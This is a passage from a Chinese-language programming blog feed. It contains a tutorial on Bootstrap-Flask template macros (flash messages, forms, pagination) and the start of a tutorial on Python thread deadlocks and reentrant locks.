tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  {{ bootstrap.load_css() }}  {{ bootstrap.load_js() }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar navbar-expand-lg navbar-light bg-light<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-toggler<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>collapse<span class="token punctuation">"</span></span> <span class="token attr-name">data-target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#navbarSupportedContent<span class="token punctuation">"</span></span> <span class="token attr-name">aria-controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbarSupportedContent<span class="token punctuation">"</span></span> <span class="token attr-name">aria-expanded</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token attr-name">aria-label</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Toggle navigation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-toggler-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>collapse navbar-collapse<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbarSupportedContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-nav mr-auto<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              {{ render_nav_item('index', '首页', use_li=True) }}             {{ render_nav_item('get_flash_messages', 'Flash messages', use_li=True) }}              {{ render_nav_item('index', '首页', use_li=True) }}          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      {{ render_messages(container=False, dismissible=True, dismiss_animate=True) }}      {% block content %}>         {% endblock %}  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设定一个视图函数</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/get_flash_messages/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_flash_messages</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  flash<span class="token punctuation">(</span><span class="token string">'A simple default alert—check it out!'</span><span class="token punctuation">)</span>  flash<span class="token punctuation">(</span><span class="token string">'A simple primary alert—check it out!'</span><span class="token punctuation">,</span> <span class="token string">'primary'</span><span class="token punctuation">)</span>  flash<span class="token punctuation">(</span><span class="token string">'A simple secondary alert—check it out!'</span><span class="token punctuation">,</span> <span class="token string">'secondary'</span><span class="token punctuation">)</span>  flash<span class="token punctuation">(</span><span class="token string">'A simple success alert—check it out!'</span><span class="token punctuation">,</span> <span class="token string">'success'</span><span class="token punctuation">)</span>  flash<span class="token punctuation">(</span><span class="token string">'A simple danger alert—check it out!'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>  flash<span class="token punctuation">(</span><span class="token string">'A simple warning alert—check it out!'</span><span class="token punctuation">,</span> <span class="token string">'warning'</span><span class="token punctuation">)</span>  flash<span class="token punctuation">(</span><span class="token string">'A simple info alert—check it out!'</span><span class="token punctuation">,</span> <span class="token string">'info'</span><span class="token punctuation">)</span>  flash<span class="token punctuation">(</span><span class="token string">'A simple light alert—check it out!'</span><span class="token punctuation">,</span> <span class="token string">'light'</span><span class="token punctuation">)</span>  flash<span class="token punctuation">(</span><span class="token string">'A simple dark alert—check it out!'</span><span class="token punctuation">,</span> <span class="token string">'dark'</span><span class="token punctuation">)</span>  flash<span class="token punctuation">(</span>Markup<span class="token punctuation">(</span>      <span class="token string">'A simple success alert with &lt;a href="#" class="alert-link">an example link&lt;/a>. Give it a click if you like.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'success'</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'get_flash_messages.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行页面,可以得到不同样式的提示框.(<code>primary, seondary, success</code>等等.)</p></blockquote><h5 id="render-form"><a href="#render-form" class="headerlink" title="render_form"></a><code>render_form</code></h5><blockquote><p>它会渲染一个完整的<code>flask_wtf/wtforms</code>的表单,并且能够提示验证错误信息.同样的,它拥有很多的参数,不过一个基本的实例如下</p><ul><li><p>添加<code>CSRF</code>保护</p><pre class="line-numbers language-python">csrf.init_app(app=app)</code></pre></li><li><p>表单验证</p><pre><code class="python"><code class="language-python">csrf.init_app(app=app)</code></pre></li><li><p>表单验证</p><pre><code class="python">class GetForm(FlaskForm):username = StringField('用户名', validators=[Length(4, 9, '请输入正确长度的用户名')], render_kw={'placeholder':'username'})password = PasswordField('密码', validators=[Length(4, 9, '请输入正确长度的密码')], render_kw={'placeholder':'password'})submit  = SubmitField('登录')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>视图设计</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/get_form/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_form</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>form <span class="token operator">=</span> GetForm<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'get_form.html'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>前端页面</p><pre class="line-numbers language-jinja2"><code class="language-jinja2">{% extends 'base.html' %}{% from 'bootstrap/form.html' import render_form %}{% block title %}>       Form>   {% endblock %}{% block content %}>       {{ render_form(form) }}>   {% endblock %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在前端只需要渲染<code>form</code>即可.<code>render_form</code>会根据<code>flask_wtf/wtforms</code>的表单定义自己生成表单内容.(有关这一部分可以查看源码宏定义)</p><p>并且能处理错误信息.</p></li></ul></blockquote><h4 id="render-field"><a href="#render-field" class="headerlink" title="render_field"></a><code>render_field</code></h4><blockquote><p>渲染一个<code>flask-wtf/wtforms</code>的<code>Field</code>,并且能够处理错误信息.</p><ul><li><p>视图</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/get_form_filed'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_form_field</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>form <span class="token operator">=</span> GetFormField<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'get_form_field.html'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>约束</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">GetFormField</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>username <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'用户名'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token string">'请输入正确长度的用户名'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> render_kw<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'placeholder'</span><span class="token punctuation">:</span> <span class="token string">'username'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>password <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span><span class="token string">'密码'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token string">'请输入正确长度的密码'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> render_kw<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'placeholder'</span><span class="token punctuation">:</span> <span class="token string">'password'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'登录'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>后端</p><pre class="line-numbers language-jinja2"><code class="language-jinja2">{% extends 'base.html' %}{% from 'bootstrap/form.html' import render_field %}{% block title %}>       Form Field>   {% endblock %}{% block content %}>       <form action method="post">>           {{ form.csrf_token }}>           {{ render_field(form.username) }}>           {{ render_field(form.password) }}>           {{ render_field(form.submit) }}>       </form>>   {% endblock %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意添加<code>csrf</code>保护,它能自动弹出错误.</p></li></ul></blockquote><h5 id="render-pager-render-pagination"><a href="#render-pager-render-pagination" class="headerlink" title="render_pager/render_pagination"></a><code>render_pager/render_pagination</code></h5><blockquote><p>分页查询,这涉及到<code>flask-sqlalchemy</code>的分页查询函数</p><pre class="line-numbers language-python"><code class="language-python">db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>paginate<span class="token punctuation">(</span>page<span class="token operator">=</span>None<span class="token punctuation">,</span> per_page<span class="token operator">=</span>None<span class="token punctuation">,</span>   error_out<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> max_per_page<span class="token operator">=</span>None<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p><code>page</code> 查询的页数</p></li><li><p><code>per_page</code> 每页的条数</p></li><li><p><code>max_per_page</code> 每页最大条数，有值时，<code>per_page</code> 受它影响</p></li><li><p><code>error_out</code>当值为 True 时，下列情况会报错</p><ul><li>当 page 为 1 时，找不到任何数据</li><li>page 小于 1，或者 per_page 为负数</li><li>page 或 per_page 不是整数</li></ul><p>该方法返回一个分页对象 <code>Pagination</code>:调用 <code>paginate()</code> 方法，会返回一个 <code>Pagination</code> 对象，它封装了当前页的各种数据和方法</p></li><li><p><code>has_next</code> 如果下一页存在，返回 True</p></li><li><p><code>has_prev</code> 如果上一页存在，返回 True</p></li><li><p><code>items</code> 当前页的数据列表</p></li><li><p><code>next_num</code> 下一页的页码</p></li><li><p><code>page</code> 当前页码</p></li><li><p><code>pages</code> 总页数</p></li><li><p><code>per_page</code> 每页的条数</p></li><li><p><code>prev_num</code> 上一页的页码</p></li><li><p><code>query</code> 用于创建此分页对象的无限查询对象。</p></li><li><p><code>total</code> 总条数</p></li><li><p><code>iter_pages(left_edge=2, left_current=2, right_current=5, right_edge=2)</code>迭代分页中的页码，四个参数，分别控制了省略号左右两侧各显示多少页码</p></li><li><p><code>next(error_out=False)</code> 返回下一页的分页对象</p></li><li><p><code>prev(error_out=False)</code> 返回上一页的分页对象</p></li><li><p>前端渲染</p><pre class="line-numbers language-jinja2"><code class="language-jinja2">{% macro render_pagination(pagination, endpoint) %}>      <div class="pagination">>      {%- for page in pagination.iter_pages() %}>        {% if page %}>          {% if page != pagination.page %}>            <a href="{{ url_for(endpoint, page=page) }}">{{ page }}</a>>          {% else %}>            <strong>{{ page }}</strong>>          {% endif %}>        {% else %}>          <span class="ellipsis">…</span>>        {% endif %}>      {%- endfor %}>      </div>>    {% endmacro %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><hr><p>理解以上之后,再观看源码</p><pre class="line-numbers language-jinja2"><code class="language-jinja2">{% macro render_pager(pagination,>                          fragment='',>                          prev=('<span aria-hidden="true">&larr;</span> Previous')|safe,>                          next=('Next <span aria-hidden="true">&rarr;</span>')|safe,>                          align='') -%}    <nav aria-label="Page navigation">        <ul class="pagination {% if align == 'center' %}justify-content-center{% elif align == 'right' %}justify-content-end{% endif %}">>                <li class="page-item {% if not pagination.has_prev %}disabled{% endif %}">                <a class="page-link"                   href="{{ url_for(request.endpoint, page=pagination.prev_num, **kwargs) + fragment if pagination.has_prev else '#' }}">                    {{ prev }}                </a>            </li>            <li class="page-item {% if not pagination.has_next %}disabled{% endif %}">                <a class="page-link"                   href="{{ url_for(request.endpoint, page=pagination.next_num, **kwargs) + fragment if pagination.has_next else '#' }}">                    {{ next }}                </a>            </li>        </ul>    </nav>{%- endmacro %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上就很好理解了,它会生成一个类似<code>http://127.0.0.1/?page=1</code>的结构体,所以可以指定如下视图</p><pre class="line-numbers language- python"><code class="language- python">@app.route('/get_pager/', methods=['GET', 'POST'])def get_pager():    db.drop_all()    db.create_all()    for i in range(100):        user = User(name='{}'.format(str(i)), password='h{}'.format(str(i)))        db.session.add(user)    db.session.commit()    page = request.args.get('page', 1, type=int)    pagination = User.query.paginate(page, 10)    messages = pagination.items    return render_template('get_pager.html', pagination=pagination, messages=messages)</li><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>requst.args.get(&#39;key&#39;, &#39;dafault&#39;, &#39;type&#39;)</code></p></li><li><p><code>page</code>是必须的,对应后端模板</p><p>后端</p><pre class="line-numbers language-jinja2"><code class="language-jinja2">{% extends 'base.html' %}{% from 'bootstrap/pagination.html' import render_pager %}{% from 'bootstrap/pagination.html' import render_pagination %}{% block title %}>        pagination>    {% endblock %}{% block content %}>        {% for message in messages %}>            Message:{{ message.id }}<br>>        {% endfor %}>    >        {{ render_pager(pagination) }}>        {{ render_pagination(pagination) }}>    {% endblock %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行可以得到如下:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-11-18/1605705100815-10332.png" alt="10322"></p></li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Flask Bootstrap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
            <tag> Bootstrap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python进程线程:使用Rlock 进行线程同步</title>
      <link href="/posts/35554.html"/>
      <url>/posts/35554.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png" alt="10305"></p><h2 id="使用Rlock-进行线程同步"><a href="#使用Rlock-进行线程同步" class="headerlink" title="使用Rlock 进行线程同步"></a>使用<code>Rlock</code> 进行线程同步</h2><h3 id="1-死锁"><a href="#1-死锁" class="headerlink" title="1.死锁"></a>1.死锁</h3><blockquote><p>使用<code>Lock</code> 进行线程同步的时候,可能会造成死锁.</p><p>所谓死锁: 是指两个或两个以上的线程在执行过程中,因争夺资源而造成的一种互相等待的现象,若无外力作用,它们都将无法推进下去.此时称系统处于死锁状态或系统产生了死锁,这些永远在互相等待的进程称为死锁进程. 由于资源占用是互斥的,当某个进程提出申请资源后,使得有关进程在无外力协助下,永远分配不到必需的资源而无法继续运行,这就产生了一种特殊现象死锁.</p><p>多个线程获取多个锁,造成死锁</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-11-12/1605194173909-10023.png" alt="10023"></p><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">"""死锁"""</span><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time<span class="token keyword">class</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> lock1<span class="token punctuation">,</span> lock2<span class="token punctuation">)</span><span class="token punctuation">:</span>  self<span class="token punctuation">.</span>alock <span class="token operator">=</span> lock1  self<span class="token punctuation">.</span>block <span class="token operator">=</span> lock2  super<span class="token punctuation">(</span>MyThread<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token triple-quoted-string string">"""acquire会返回布尔值"""</span>  <span class="token keyword">if</span> self<span class="token punctuation">.</span>alock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">' up'</span><span class="token punctuation">)</span>      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token keyword">if</span> self<span class="token punctuation">.</span>block<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true"># self.block进入阻塞状态,等待self.alock释放锁</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">' down'</span><span class="token punctuation">)</span>          self<span class="token punctuation">.</span>block<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>alock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">MyThread1</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> lock1<span class="token punctuation">,</span> lock2<span class="token punctuation">)</span><span class="token punctuation">:</span>  self<span class="token punctuation">.</span>alock <span class="token operator">=</span> lock1  self<span class="token punctuation">.</span>block <span class="token operator">=</span> lock2  super<span class="token punctuation">(</span>MyThread1<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token triple-quoted-string string">"""acquire会返回布尔值"""</span>  <span class="token keyword">if</span> self<span class="token punctuation">.</span>block<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">'up'</span><span class="token punctuation">)</span>      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token keyword">if</span> self<span class="token punctuation">.</span>alock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true"># self.alock进入阻塞状态,等待self.block释放锁</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">'down'</span><span class="token punctuation">)</span>          self<span class="token punctuation">.</span>alock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>block<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>lock1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>lock2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>t1<span class="token operator">=</span>MyThread<span class="token punctuation">(</span>lock1<span class="token punctuation">,</span> lock2<span class="token punctuation">)</span>t2<span class="token operator">=</span>MyThread1<span class="token punctuation">(</span>lock1<span class="token punctuation">,</span> lock2<span class="token punctuation">)</span>t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更简单的情况是,一个线程多次去获取锁,造成死锁</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">import</span> timenum <span class="token operator">=</span> <span class="token number">0</span><span class="token comment" spellcheck="true"># 创建锁定池</span>mutex <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>super<span class="token punctuation">(</span>MyThread<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">global</span> numtime<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 获取锁</span><span class="token keyword">if</span> mutex<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 设置了超时时间</span>   num <span class="token operator">+=</span> <span class="token number">1</span>   msg <span class="token operator">=</span> <span class="token string">"{} set num to {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> num<span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>   mutex<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 单一线程重复获取锁,锁没有释放,变成死锁</span>   mutex<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>   mutex<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>t <span class="token operator">=</span> MyThread<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了支持同一线程中,多次请求同一资源,python提供了<code>Rlock</code> 可重入锁.</p></blockquote><h3 id="2-可重入锁-递归锁"><a href="#2-可重入锁-递归锁" class="headerlink" title="2.可重入锁/递归锁"></a>2.可重入锁/递归锁</h3><blockquote><p><code>Rlock</code>()Reentrant Lock:重入锁\递归锁说的都是它.这种锁对比<code>Lock</code> 有以下特点:</p><ul><li>谁拿到谁释放.如果线程A拿到锁,线程B无法释放这个锁,只有A可以</li><li>同一线程可以多次拿到该锁,即可以多次<code>acquire()</code> .</li><li><code>acquire()</code> 多少次就必须<code>release()</code> 